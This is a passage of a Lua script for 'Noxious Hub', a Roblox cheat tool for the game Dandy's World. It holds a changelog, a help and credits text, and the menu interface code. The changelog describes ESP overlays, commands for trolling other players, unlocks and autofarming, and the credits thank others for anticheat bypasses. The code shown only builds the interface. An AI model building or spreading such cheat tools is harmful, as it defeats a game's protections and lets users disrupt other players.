	"- Adjusted tooltip UI elements.",
	"- Adjusted notification UI elements.",
	" ",
	"Command updates:",
	"- Reverted color ESP to green for tapes and research capsules for item ESP, due to",
	"   performance issues.",
	"- Adjusted descriptions for certain commands.",
	"- Fixed enable / disable jumping command not working on runs.",
	"- Fixed restorecharacter command not working after running ghostcharacter [color].",
	" ",
	"Other:",
	"- Revamped notification functionality.",
	"- Corrected spelling errors.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.2.9, released on Saturday, December 20th 2024]:",
	" ",
	"UI changes:",
	"- Upgraded intro text.",
	"- Upgraded tooltip UI.",
	" ",
	"Command updates:",
	"- Added 2 'Local Player' commands. (changeownertagtext [text] and getvintageskin",
	"   [toon name])",
	"- Added 1 'Fun / Trolls' command. (runrpability [toon name])",
	"- Removed warnings for commands.",
	"- Fixed enableglitchednametag command not working at all.",
	"- Fixed sproutselfheal command not working at all.",
	"- Fixed becomedandy command not working at all.",
	"- Made it so enableglitchednametag affects your name tag in the interface.",
	"- Fixed item ESP not getting highlighted a different color for specific items.",
	"- Made it so tapes get highlighted a different color for item ESP.",
	"- Made it so research capsules get highlighted a different color for item ESP.",
	"- Added 'color' argument for ghostcharacter.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.2.8, released on Friday, December 20th 2024]:",
	" ",
	"UI changes:",
	"- Adjusted top frame and bottom frame text.",
	"- Upgraded intro text.",
	" ",
	"Command updates:",
	"- Made it so heals and extraction items get highlighted a different color for item ESP.",
	"- Fixed item ESP not getting highlighted a different color for specific items.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.2.7, released on Thursday, December 19th 2024]:",
	" ",
	"Command updates:",
	"- Fixed 'random' player argument not working for bang, bbang, head, hjump and hsit.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.2.6, released on Tuesday, December 17th 2024]:",
	" ",
	"Command updates:",
	"- Fixed character jittering when running bang, bbang, head, hjump and hsit.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.2.5, released on Monday, December 16th 2024]:",
	" ",
	"UI changes:",
	"- Adjusted intro GUI text.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.2.4, released on Sunday, December 15th 2024]:",
	" ",
	"Command updates:",
	"- Changed script that loads when running hexdwscript.",
	"- Made it so player ESP shows the players' display names.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.2.3, released on Saturday, December 14th 2024]:",
	" ",
	"UI changes:",
	"- Made intro GUI significantly smaller.",
	" ",
	"Command updates:",
	"- Made it so items have a space in their names if it contains 2 or more words.",
	"- Fixed research capsule ESP text not displaying the twisted research it gives you.",
	"- Fixed stoprunningconnections command not working on runs.",
	"- Made it so generator ESP gets highlighted cyan if posessed.",
	" ",
	"Other:",
	"- Added more information to the Info tab.",
	"- Made it so clicking the icon in the intro's loading sequence skips it.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.2.1, released on Friday, December 13th 2024]:",
	" ",
	"UI changes:",
	"- Fixed top frame of the tooltip UI overlapping with the bottom frame.",
	"- Made it so clicking on a command button displays arrows pointing at the button",
	"   name.",
	"- Adjusted the intro's UI elements.",
	"- Changed 'Welcome' text to 'Hello' for the interface's top frame.",
	"- Fixed command buttons not displaying command lists when pressed on mobile.",
	" ",
	"Command updates:",
	"- Changed 'Hex' to 'Zyra' for hexdwscript and hexdiscord.",
	"- Fixed sproutselfheal command not working on some occasions.",
	"- Made it so generator ESP shows the current and required amount of Ichor.",
	"- Made it so research capsules show what twisted research it gives you.",
	"- Removed 'Monster' suffix and added 'Twisted' prefix for monster ESP text and for",
	"   research capsule text.",
	" ",
	"Other:",
	"- Added an intro to ensure the script works just fine.",
	"- Made it so pressing Q skips the intro's loading sequence.",
	"- Made it so pressing N toggles the interface visibility.",
	"- Changed startup print statements' prefixes from ':3' to 'Noxious'.",
	"- Added Connie and Looey's extracting animations to the Animation GUI.",
	"- Added Twisted Connie and Looey's idle, running and walking animations to the",
	"   Animation GUI.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.2.0, released on Wednesday, December 11th 2024]:",
	" ",
	"UI changes:",
	"- Adjusted interface UI elements.",
	"- Made it so the toggle button disappears when opening the donation prompt.",
	" ",
	"Command updates:",
	"- Added warnings for commands.",
	"- Added 'all' after 'pickup' for pickupresearchcapsules and pickuptapes.",
	" ",
	"Other:",
	"- Euxqj 'klp' edfn.",
	"- Pdgh lw vr 'kh' kdv d orz fkdqfh ri dsshdulqj.",
	"- Pdgh lw vr 'kh' fdq dsshdu rq fhuwdlq iorruv.",
	"- Pdgh lw vr 'kh' fdq frppxqlfdwh zlwk brx.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.1.9, released on Monday, December 9th 2024]:",
	" ",
	"UI changes:",
	"- Adjusted interface UI elements.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.1.8, released on Saturday, December 7th 2024]:",
	" ",
	"UI changes:",
	"- Adjusted interface UI elements.",
	"- Added 2 new tabs. (Info and Credits)",
	"- Made it so the button doesn't disappear when the interface is visible.",
	"- Revamped notification UI.",
	"- Fixed commands list overlapping or not disappearing after clicking or",
	"   tapping on another tab.",
	"- Fixed tab buttons overlapping with the tooltip UI.",
	" ",
	"Command updates:",
	"- Brung back 2 'Main' commands. (enable / disable mobiletapindicators)",
	"- Added 2 'Local Player' commands. (qualityoflifegui and autofarmgui)",
	"- Added 2 'ESPs / Visuals' commands. (enable / disable rainbowespcolors)",
	"- Added 2 'Teleports' commands. (teleporttoboxofdoom and teleporttostage)",
	"- Fixed sproutselfheal command not working on some occasions.",
	"- Changed ghost character's material from Neon to Forcefield for the",
	"   ghostcharacter commands.",
	"- Fixed show / hide playerhealth commands not working after using ability.",
	" ",
	"Other:",
	"- Added Connie and Looey's idle, running and walking animations to the",
	"   Animation GUI.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.1.7, released on Friday, December 6th 2024]:",
	" ",
	"UI changes:",
	"- Upgraded changelogs text design.",
	" ",
	"Command updates:",
	"- Fixed deleteinvisibleborders command not deleting borders / invisible walls in",
	"   some floors.",
	"- Added Looey and Connie for the unlockalltoons command.",
	"- Added Looey and Connie's trinkets for the unlockalltrinkets command.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.1.6, released on Thursday, December 5th 2024]:",
	" ",
	"UI changes:",
	"- Adjusted interface UI elements.",
	"- Adjusted notification UI elements.",
	"- Added tabs. (Commands and Changelogs)",
	"- Upgraded Noxious Team Members' image labels.",
	" ",
	"Command updates:",
	"- Added 2 'Main' commands. (show / hide developerlabel)",
	"- Added 2 'Map / Environment' commands. (show / hide playerhealth)",
	"- Adjusted descriptions for certain commands.",
	" ",
	"Other:",
	"- Updated Razzle & Dazzle's aliases to: RazzleDazzle, RazzleAndDazzle, and",
	"   RND.",
	" ",
	"--------------------------------------------------------------------------------------------",
}

-------------------------------------------------------------------------------------------------------------------------------

noxious["information"] = {
	"--------------------------------------- Information: ---------------------------------------",
	" ",
	"Noxious Hub: Dandy's World (Version " .. noxious["version"] .. ")",
	" ",
	"A script used to enhance your experience when playing Dandy's World.",
	"Thank you all for "..noxious["uses"].. " uses!",
	" ",
	"Think you've discovered a bug? Report it in our Discord server!",
	"Got any suggestions? Drop them in our Discord server!",
	" ",
	"The exclamation point (!) next to a command means that the command hasn't been",
	"properly implemented yet, hasn't been tested, or just doesnt function properly.",
	"Command prefix: .",
	" ",
	"The 'P' mark (P) next to a command means that the command is fully patched for",
	"now, and the 'HP' mark (HP) next to a command means that the command is half",
	"patched, meaning that it can still be used on yourself or doesn't work properly.",
	" ",
	"Press Q or the icon to skip the loading sequence after running the script.",
	"Press the toggle button to toggle the visibility of the interface.",
	"Press X on your keyboard to close all notifications.",
	" ",
	"-------------------- Toon names (For commands, like faketooncard.): --------------------",
	" ",
	"'Astro' = Astro",
	"'Bassie' = Bassie",
	"'Boxten' = Boxten",
	"'Bobette' = Bobette",
	"'Brightney' = Brightney",
	"'Coal' = Coal",
	"'Cocoa' = Cocoa",
	"'Connie' = Connie",
	"'Cosmo' = Cosmo",
	"'Eggson' = Eggson",
	"'Finn' = Finn",
	"'Flutter' = Flutter",
	"'Flyte' = Flyte",
	"'Gigi' = Gigi",
	"'Ginger' = Ginger",
	"'Glisten' = Glisten",
	"'Goob' = Goob",
	"'Looey' = Looey",
	"'Pebble', 'Pebbles' = Pebble",
	"'Poppy' = Poppy",
	"'RazzleAndDazzle', 'RazzleDazzle', 'RND' = Razzle & Dazzle",
	"'Rodger' = Rodger",
	"'Rudie' = Rudie",
	"'Scraps' = Scraps",
	"'Shelly' = Shelly",
	"'Shrimpo' = Shrimpo",
	"'Srpout' = Sprout",
	"'Teagan' = Teagan",
	"'Tisha' = Tisha",
	"'Toodles' = Toodles",
	"'Vee' = Vee",
	"'Yatta' = Yatta",
	"'Dandy' = Dandy",
	" ",
	"--------------------------------------- Arguments: ---------------------------------------",
	" ",
	"[target] = A target from the player arguments",
	"[target 1] [target 2] = Command will run on target 1 and will affect target 2",
	"[color] = A color from the color arguments",
	"[number] = Inputted number will run on the command",
	"[speed] = Desired amount of speed (Number)",
	"[delay] = Amount of seconds before running the functionality of a loop (Number)",
	"[text] = Inputted text will run on the command",
	"[toon name] = A Toon from the Toon names",
	" ",
	"---------- Player arguments (For commands, like the Fun / Trolls commands.): ----------",
	" ",
	"'Me' = Targets you",
	"'Others' = Targets everyone but you (Ineffective for certain commands.)",
	"'All' = Targets everyone in the server (Ineffective for certain commands.)",
	"'Random' = Targets a random player in the server",
	"'(Username)' = Targets the specified username",
	" ",
	"--------- Color arguments (For commands, like the ghostcharacter command.): ---------",
	" ",
	"'Red', 'R' = Red color",
	"'Orange', 'O' = Orange color",
	"'Yellow', 'Y' = Yellow color",
	"'Green', 'GN' = Green color",
	"'Cyan', 'C' = Cyan color",
	"'Blue', 'BE' = Blue color",
	"'Purple', 'PE' = Purple color",
	"'Pink', 'PK' = Pink color",
	"'Brown', 'BN' = Brown color",
	"'White', 'W' = White color",
	"'Gray', 'GY' = Gray color",
	"'Black', 'BK' = Black color",
	"'Rainbow', 'RB' = Dynamic rainbow",
	" ",
	"--------------------------------------------------------------------------------------------",
}

-------------------------------------------------------------------------------------------------------------------------------

noxious["dandy's world workspace.info"] = {
	"------------------------------ Information (Workspace.Info): ------------------------------",
	" ",
	"'Info' Folder not found.",
	" ",
	"--------------------------------------------------------------------------------------------",
}

-------------------------------------------------------------------------------------------------------------------------------

noxious["credits"] = {
	"--------------------------------- Team Noxious & Others: ---------------------------------",
	" ",
	"unable & Plethora - Scripting, UI designing",
	"dextrocities & Colton - Scripting, Bug fixing",
	"hypno, ethereal, & SpecialsUnicodeBlock - Scripting",
	"OpenAI (ChatGPT) & Reluxiety - Bug fixing",
	"Lexia & uwusploit - UI designing",
	"Ace, IwwegalSubstances & Noxious Script Testers - Testing",
	" ",
	"------------------------------ Additional thanks / credits to: ------------------------------",
	" ",
	"union (Riddance) - For 'Riddance Autofarm' Script and anticheat bypasses",
	"Rode Striker - For 'Glisten's Animation Closet' and 'The Dandy Helper' Scripts",
	"ApparentlySpooks & Mox - For 'MoxHub' and 'Spooks Hub' Scripts",
	"Otvajni - For 'Fly REBORN' and 'EgasHub' Scripts",
	"bob junior - For 'B0bbyhub' Script",
	"Bac0nH1ckOff - For 'OP SCRIPT | REUPLOAD' Script",
	"Yiw (@omg0960 on Discord) - For 'Yiw Hub' Script",
	"G0bbyD0llan57 - For 'G0bbyD0llan DW' Script",
	"Hex233222 - For 'Hex's Hub' Script",
	"RED_BLOXZ - For 'Mobile Keyboard' Script",
	"Edge & Others - For 'FE Infinite Yield' Script",
	"Moon & Others - For 'Dark Dex' Script",
	"ScriptBlox Comments - Suggestions & Bug reporting",
	"@gigi_hilton on Discord - Gigi & Shelly Valentines Skins & Twisted Poppy Skin",
	"FFJ - For 'Dandys | FFJ Hub' Script",
	"jaonoobao - For 'Poltergeist Hub' Script",
	" ",
	"--------------------------------------------------------------------------------------------",
}

-------------------------------------------------------------------------------------------------------------------------------

noxious["changelogs holder"] = Instance.new"ScrollingFrame"
noxious["changelogs holder"].Visible = false
noxious["changelogs holder"].Size = UDim2.new(1, 0, 0, 204)
noxious["changelogs holder"].Position = UDim2.new(0, 0, 0, 80)
noxious["changelogs holder"].CanvasSize = UDim2.new(0, 0, 0, 0)
noxious["changelogs holder"].ScrollBarThickness = 10
noxious["changelogs holder"].ScrollBarImageColor3 = noxious["default white color"]
noxious["changelogs holder"].BackgroundTransparency = 1
noxious["changelogs holder"].BorderSizePixel = 0
noxious["changelogs holder"].BorderColor3 = noxious["default white color"]
noxious["changelogs holder"].ScrollingDirection = Enum.ScrollingDirection.Y
noxious["changelogs holder"].Parent = mainframe

noxious["changelogs text padding"] = Instance.new"UIPadding"
noxious["changelogs text padding"].PaddingLeft = UDim.new(0, 8)
noxious["changelogs text padding"].PaddingTop = UDim.new(0, 4)
noxious["changelogs text padding"].Parent = noxious["changelogs holder"]

function populateChangelogs(entries)
	for _, text in ipairs(entries) do
		local line = Instance.new"TextLabel"		
		line.Size = UDim2.new(1, -10, 0, 30)
		line.Position = UDim2.new(0, 5, 0, noxious["changelogs holder"].CanvasSize.Y.Offset)
		line.TextColor3 = noxious["default white color"]
		line.BackgroundTransparency = 1
		line.Font = Enum.Font.Nunito
		line.TextSize = 19
		line.Text = text
		line.TextWrapped = true
		line.TextScaled = false
		line.TextXAlignment = Enum.TextXAlignment.Left
		line.Parent = noxious["changelogs holder"]

		noxious["changelogs holder"].CanvasSize = UDim2.new(0, 0, 0.06, noxious["changelogs holder"].CanvasSize.Y.Offset + 18)
	end
end

-------------------------------------------------------------------------------------------------------------------------------

noxious["information holder"] = Instance.new"ScrollingFrame"
noxious["information holder"].Visible = false
noxious["information holder"].Size = UDim2.new(1, 0, 0, 204)
noxious["information holder"].Position = UDim2.new(0, 0, 0, 80)
noxious["information holder"].CanvasSize = UDim2.new(0, 0, 0, 0)
noxious["information holder"].ScrollBarThickness = 10
noxious["information holder"].ScrollBarImageColor3 = noxious["default white color"]
noxious["information holder"].BackgroundTransparency = 1
noxious["information holder"].BorderSizePixel = 0
noxious["information holder"].BorderColor3 = noxious["default white color"]
noxious["information holder"].ScrollingDirection = Enum.ScrollingDirection.Y
noxious["information holder"].Parent = mainframe

noxious["information text padding"] = Instance.new"UIPadding"
noxious["information text padding"].PaddingLeft = UDim.new(0, 8)
noxious["information text padding"].PaddingTop = UDim.new(0, 4)
noxious["information text padding"].Parent = noxious["information holder"]

function populateInformation(entries)
	for _, text in ipairs(entries) do
		local line = Instance.new"TextLabel"		
		line.Size = UDim2.new(1, -10, 0, 30)
		line.Position = UDim2.new(0, 5, 0, noxious["information holder"].CanvasSize.Y.Offset)
		line.TextColor3 = noxious["default white color"]
		line.BackgroundTransparency = 1
		line.Font = Enum.Font.Nunito
		line.TextSize = 19
		line.Text = text
		line.TextWrapped = true
		line.TextScaled = false
		line.TextXAlignment = Enum.TextXAlignment.Left
		line.Parent = noxious["information holder"]

		noxious["information holder"].CanvasSize = UDim2.new(0, 0, 0.06, noxious["information holder"].CanvasSize.Y.Offset + 18)
	end
end

-------------------------------------------------------------------------------------------------------------------------------

function populateinfo()
	local infoFolder = workspace:FindFirstChild("Info")
	if not infoFolder then
		local function populateInformation2(entries)
			for _, text in ipairs(entries) do
				local line = Instance.new("TextLabel")
				line.Size = UDim2.new(1, -10, 0, 30)
				line.Position = UDim2.new(0, 5, 0, noxious["dandy's world workspace.info holder"].CanvasSize.Y.Offset)
				line.TextColor3 = noxious["default white color"]
				line.BackgroundTransparency = 1
				line.Font = Enum.Font.Nunito
				line.TextSize = 19
				line.Text = text
				line.TextWrapped = true
				line.TextScaled = false
				line.TextXAlignment = Enum.TextXAlignment.Left
				line.Parent = noxious["dandy's world workspace.info holder"]

				noxious["dandy's world workspace.info holder"].CanvasSize = UDim2.new(0, 0, 0.06, noxious["dandy's world workspace.info holder"].CanvasSize.Y.Offset + 18)
			end
		end

		populateInformation2(noxious["dandy's world workspace.info"])
		return
	end

	local function getValue(instance)
		if instance:IsA("StringValue") then
			return instance.Value
		elseif instance:IsA("IntValue") or instance:IsA("NumberValue") or instance:IsA("BoolValue") then
			return tostring(instance.Value)
		else
			return "N/A"
		end
	end

	local excludedNames = {
		["Message"] = true,
		["PickedCharacters"] = true,
		["PlayerStats"] = true,
		["CardVote"] = true,
		["DandyTracker"] = true,
		["CardModifiers"] = true,
		["ForceSpawnFloor"] = true,
		["GameStats"] = true,
		["ElevatorPrompt"] = true,
	}

	local function populateWorkspaceInfo()
		for _, child in ipairs(noxious["dandy's world workspace.info holder"]:GetChildren()) do
			if child:IsA("TextLabel") then
				child:Destroy()
			end
		end

		noxious["dandy's world workspace.info holder"].CanvasSize = UDim2.new(0, 0, 0, 0)

		local yOffset = 0
		local function addLine(text)
			local line = Instance.new("TextLabel")
			line.Size = UDim2.new(1, -10, 0, 30)
			line.Position = UDim2.new(0, 5, 0, yOffset)
			line.TextColor3 = noxious["default white color"]
			line.BackgroundTransparency = 1
			line.Font = Enum.Font.Nunito
			line.TextSize = 19
			line.Text = text
			line.TextWrapped = true
			line.TextScaled = false
			line.TextXAlignment = Enum.TextXAlignment.Left
			line.Parent = noxious["dandy's world workspace.info holder"]

			yOffset = yOffset + 18
			noxious["dandy's world workspace.info holder"].CanvasSize = UDim2.new(0, 0, 0, yOffset + 20)
		end

		addLine("------------------------------ Information (Workspace.Info): ------------------------------")
		addLine(" ")

		for _, child in ipairs(infoFolder:GetChildren()) do
			if not excludedNames[child.Name] then
				addLine("[" .. child.Name .. "]: " .. getValue(child))
			end
		end

		addLine(" ")
		addLine("--------------------------------------------------------------------------------------------")
	end

	-- Populate initial content
	populateWorkspaceInfo()

	-- Automatically update when Info folder changes
	local function connectFolderListeners()
		-- Update when children are added or removed
		infoFolder.ChildAdded:Connect(function()
			wait(0.1) -- Small delay to ensure the child is properly initialized
			populateWorkspaceInfo()
		end)

		infoFolder.ChildRemoved:Connect(populateWorkspaceInfo)

		-- Update when any child's value changes
		for _, child in ipairs(infoFolder:GetChildren()) do
			if child:IsA("ValueBase") then
				child:GetPropertyChangedSignal("Value"):Connect(populateWorkspaceInfo)
			end
		end

		-- Watch for new children to connect their value change signals
		infoFolder.ChildAdded:Connect(function(child)
			if child:IsA("ValueBase") then
				child:GetPropertyChangedSignal("Value"):Connect(populateWorkspaceInfo)
			end
		end)
	end

	-- Establish listeners
	connectFolderListeners()
end

-- Create the ScrollingFrame
noxious["dandy's world workspace.info holder"] = Instance.new("ScrollingFrame")
noxious["dandy's world workspace.info holder"].Visible = false
noxious["dandy's world workspace.info holder"].Size = UDim2.new(1, 0, 0, 204)
noxious["dandy's world workspace.info holder"].Position = UDim2.new(0, 0, 0, 80)
noxious["dandy's world workspace.info holder"].CanvasSize = UDim2.new(0, 0, 0, 0)
noxious["dandy's world workspace.info holder"].ScrollBarThickness = 10
noxious["dandy's world workspace.info holder"].ScrollBarImageColor3 = noxious["default white color"]
noxious["dandy's world workspace.info holder"].BackgroundTransparency = 1
noxious["dandy's world workspace.info holder"].BorderSizePixel = 0
noxious["dandy's world workspace.info holder"].BorderColor3 = noxious["default white color"]
noxious["dandy's world workspace.info holder"].ScrollingDirection = Enum.ScrollingDirection.Y
noxious["dandy's world workspace.info holder"].Parent = mainframe

-- Add padding
noxious["dandy's world workspace.info text padding"] = Instance.new("UIPadding")
noxious["dandy's world workspace.info text padding"].PaddingLeft = UDim.new(0, 8)
noxious["dandy's world workspace.info text padding"].PaddingTop = UDim.new(0, 4)
noxious["dandy's world workspace.info text padding"].Parent = noxious["dandy's world workspace.info holder"]

-------------------------------------------------------------------------------------------------------------------------------

noxious["credits holder"] = Instance.new"ScrollingFrame"
noxious["credits holder"].Visible = false
noxious["credits holder"].Size = UDim2.new(1, 0, 0, 204)
noxious["credits holder"].Position = UDim2.new(0, 0, 0, 80)
noxious["credits holder"].CanvasSize = UDim2.new(0, 0, 0, 0) -- Will adjust dynamically
noxious["credits holder"].ScrollBarThickness = 10
noxious["credits holder"].ScrollBarImageColor3 = noxious["default white color"]
noxious["credits holder"].BackgroundTransparency = 1
noxious["credits holder"].BorderSizePixel = 0
noxious["credits holder"].BorderColor3 = noxious["default white color"]
noxious["credits holder"].ScrollingDirection = Enum.ScrollingDirection.Y
noxious["credits holder"].Parent = mainframe

noxious["credits text padding"] = Instance.new"UIPadding"
noxious["credits text padding"].PaddingLeft = UDim.new(0, 8)
noxious["credits text padding"].PaddingTop = UDim.new(0, 4)
noxious["credits text padding"].Parent = noxious["credits holder"]

function populatecredits(entries)
	for _, text in ipairs(entries) do
		local line = Instance.new"TextLabel"		
		line.Size = UDim2.new(1, -10, 0, 30) -- Full width, fixed height
		line.Position = UDim2.new(0, 5, 0, noxious["credits holder"].CanvasSize.Y.Offset) -- Position below the previous lines
		line.TextColor3 = noxious["default white color"]
		line.BackgroundTransparency = 1
		line.Font = Enum.Font.Nunito
		line.TextSize = 19
		line.Text = text
		line.TextWrapped = true
		line.TextScaled = false
		line.TextXAlignment = Enum.TextXAlignment.Left
		line.Parent = noxious["credits holder"]

		-- Update the CanvasSize to fit new content
		noxious["credits holder"].CanvasSize = UDim2.new(0, 0, 0.06, noxious["credits holder"].CanvasSize.Y.Offset + 18)
	end
end

-------------------------------------------------------------------------------------------------------------------------------

noxious["workspace.info button"].MouseButton1Click:Connect(
	function()
		noxious["click sound"]:Play()
		noxious["workspace.info button"].Text = "> Workspace.Info <"
		noxious["noxious info button"].Text = "Noxious Info"

		noxious["information holder"].Visible = false
		noxious["dandy's world workspace.info holder"].Visible = true
	end
)

-------------------------------------------------------------------------------------------------------------------------------

noxious["noxious info button"].MouseButton1Click:Connect(
	function()
		noxious["click sound"]:Play()
		noxious["workspace.info button"].Text = "Workspace.Info"
		noxious["noxious info button"].Text = "> Noxious Info <"

		noxious["information holder"].Visible = true
		noxious["dandy's world workspace.info holder"].Visible = false
	end
)

-------------------------------------------------------------------------------------------------------------------------------

noxious["changelogs tab"].MouseButton1Click:Connect(
	function()
		noxious["click sound"]:Play()
		noxious["back to commands button"].Visible = true
		noxious["reload noxious button"].Visible = true
		noxious["dandy's world workspace.info holder"].Visible = false
		noxious["workspace.info button"].Visible = false
		noxious["noxious info button"].Visible = false
		noxious["developer note button"].Visible = false
		noxious["changelogs tab"].Text = "> Changelogs <"
		noxious["commands tab"].Text = "Commands"
		noxious["information tab"].Text = "Info"
		noxious["credits tab"].Text = "Credits"
		noxious["execute button"].Visible = false
		noxious["hide"].Visible = false
		noxious["information holder"].Visible = false
		noxious["credits holder"].Visible = false
		noxious["changelogs holder"].Visible = true
		noxious["introduction"].Visible = false
		noxious["command button holder"].Visible = false
		noxious["command bar"].Visible = false
		noxious["scroll bar holder"].Visible = false
		noxious["scroll bar holder 2"].Visible = true
		local commandscrollframe = mainframe:FindFirstChild"CommandScrollFrame"		
		local text1 = mainframe:FindFirstChild"HoverToView"		
		local text2 = mainframe:FindFirstChild"List of commands"		
		if commandscrollframe or text1 or text2 then
			commandscrollframe.Visible = false
			text1.Visible = false
			text2.Visible = false
		end
	end
)

-------------------------------------------------------------------------------------------------------------------------------

noxious["information tab"].MouseButton1Click:Connect(
	function()
		noxious["click sound"]:Play()
		noxious["back to commands button"].Visible = false
		noxious["reload noxious button"].Visible = false
		noxious["dandy's world workspace.info holder"].Visible = false
		noxious["noxious info button"].Text = "> Noxious Info <"
		noxious["workspace.info button"].Text = "Workspace.Info"
		noxious["workspace.info button"].Visible = true
		noxious["noxious info button"].Visible = true
		noxious["developer note button"].Visible = false
		noxious["execute button"].Visible = false
		noxious["hide"].Visible = false
		noxious["information tab"].Text = "> Info <"
		noxious["changelogs tab"].Text = "Changelogs"
		noxious["commands tab"].Text = "Commands"
		noxious["credits tab"].Text = "Credits"
		noxious["information holder"].Visible = true
		noxious["credits holder"].Visible = false
		noxious["changelogs holder"].Visible = false
		noxious["introduction"].Visible = false
		noxious["command button holder"].Visible = false
		noxious["command bar"].Visible = false
		noxious["scroll bar holder"].Visible = false
		noxious["scroll bar holder 2"].Visible = true
		local commandscrollframe = mainframe:FindFirstChild"CommandScrollFrame"		
		local text1 = mainframe:FindFirstChild"HoverToView"		
		local text2 = mainframe:FindFirstChild"List of commands"		
		if commandscrollframe or text1 or text2 then
			commandscrollframe.Visible = false
			text1.Visible = false
			text2.Visible = false
		end
	end
)

-------------------------------------------------------------------------------------------------------------------------------

noxious["credits tab"].MouseButton1Click:Connect(
	function()
		noxious["click sound"]:Play()
		noxious["back to commands button"].Visible = true
		noxious["reload noxious button"].Visible = false
		noxious["dandy's world workspace.info holder"].Visible = false
		noxious["workspace.info button"].Visible = false
		noxious["noxious info button"].Visible = false
		noxious["developer note button"].Visible = true
		noxious["credits tab"].Text = "> Credits <"
		noxious["changelogs tab"].Text = "Changelogs"
		noxious["commands tab"].Text = "Commands"
		noxious["information tab"].Text = "Info"
		noxious["execute button"].Visible = false
		noxious["hide"].Visible = false
		noxious["information holder"].Visible = false
		noxious["credits holder"].Visible = true
		noxious["changelogs holder"].Visible = false
		noxious["introduction"].Visible = false
		noxious["command button holder"].Visible = false
		noxious["command bar"].Visible = false
		noxious["scroll bar holder"].Visible = false
		noxious["scroll bar holder 2"].Visible = true
		local commandscrollframe = mainframe:FindFirstChild"CommandScrollFrame"		
		local text1 = mainframe:FindFirstChild"HoverToView"		
		local text2 = mainframe:FindFirstChild"List of commands"		
		if commandscrollframe or text1 or text2 then
			commandscrollframe.Visible = false
			text1.Visible = false
			text2.Visible = false
		end
	end
)

-------------------------------------------------------------------------------------------------------------------------------

noxious["commands tab"].MouseButton1Click:Connect(
	function()
		noxious["click sound"]:Play()
		noxious["back to commands button"].Visible = false
		noxious["reload noxious button"].Visible = false
		noxious["dandy's world workspace.info holder"].Visible = false
		noxious["workspace.info button"].Visible = false
		noxious["noxious info button"].Visible = false
		noxious["developer note button"].Visible = false
		noxious["execute button"].Visible = true
		noxious["hide"].Visible = true
		noxious["commands tab"].Text = "> Commands <"
		noxious["changelogs tab"].Text = "Changelogs"
		noxious["information tab"].Text = "Info"
		noxious["credits tab"].Text = "Credits"
		noxious["information holder"].Visible = false
		noxious["credits holder"].Visible = false
		noxious["changelogs holder"].Visible = false
		noxious["introduction"].Visible = true
		noxious["command button holder"].Visible = true
		noxious["command bar"].Visible = true
		noxious["scroll bar holder"].Visible = true
		noxious["scroll bar holder 2"].Visible = false
		local commandscrollframe = mainframe:FindFirstChild"CommandScrollFrame"		
		local text1 = mainframe:FindFirstChild"HoverToView"		
		local text2 = mainframe:FindFirstChild"List of commands"		
		if commandscrollframe or text1 or text2 then
			commandscrollframe.Visible = true
			text1.Visible = true
			text2.Visible = true
		end
	end
)

noxious["back to commands button"].MouseButton1Click:Connect(
	function()
		noxious["click sound"]:Play()
		noxious["back to commands button"].Visible = false
		noxious["reload noxious button"].Visible = false
		noxious["dandy's world workspace.info holder"].Visible = false
		noxious["workspace.info button"].Visible = false
		noxious["noxious info button"].Visible = false
		noxious["developer note button"].Visible = false
		noxious["commands tab"].Text = "> Commands <"
		noxious["changelogs tab"].Text = "Changelogs"
		noxious["information tab"].Text = "Info"
		noxious["credits tab"].Text = "Credits"
		noxious["execute button"].Visible = true
		noxious["hide"].Visible = true
		noxious["information holder"].Visible = false
		noxious["credits holder"].Visible = false
		noxious["changelogs holder"].Visible = false
		noxious["introduction"].Visible = true
		noxious["command button holder"].Visible = true
		noxious["command bar"].Visible = true
		noxious["scroll bar holder"].Visible = true
		noxious["scroll bar holder 2"].Visible = false
		local commandscrollframe = mainframe:FindFirstChild"CommandScrollFrame"		
		local text1 = mainframe:FindFirstChild"HoverToView"		
		local text2 = mainframe:FindFirstChild"List of commands"		
		if commandscrollframe or text1 or text2 then
			commandscrollframe.Visible = true
			text1.Visible = true
			text2.Visible = true
		end
	end
)

-------------------------------------------------------------------------------------------------------------------------------

local lastframeseen = "mainframe"

function togglevisibility2()
	if lastframeseen == "mainframe" then
		mainframe.Visible = not mainframe.Visible
	else
		mainframe2.Visible = not mainframe2.Visible
	end
end

noxious["toggle interface visibility button"].MouseButton1Click:Connect(
	function()
		togglevisibility2()
		noxious["click sound"]:Play()
	end
)

-------------------------------------------------------------------------------------------------------------------------------

-- Create the main frame
mainframe2.Name = "mainframe"
mainframe2.Size = UDim2.new(0, 594, 0, 330)  -- Adjusted size
mainframe2.BackgroundColor3 = noxious["default black color"]
mainframe2.BorderSizePixel = 1
mainframe2.BorderColor3 = noxious["default white color"]
mainframe2.BackgroundTransparency = 0.2
mainframe2.Parent = noxious["noxious screen gui"]
mainframe2.Visible = false

function centermainframe2()
	local screenWidth = game:GetService"Workspace".CurrentCamera.ViewportSize.X
	local screenHeight = game:GetService"Workspace".CurrentCamera.ViewportSize.Y

	-- Calculate the position to center the frame on the screen
	local frameWidth = 594
	local frameHeight = 330
	local centerX = (screenWidth - frameWidth) / 2
	local centerY = (screenHeight - frameHeight) / 2 - 58

	-- Set the position to center it on the screen
	mainframe2.Position = UDim2.new(0, centerX, 0, centerY)
end
centermainframe2()

function dragmainframe2()
	local frame = mainframe2
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatemainframeinput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService'TweenService':Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

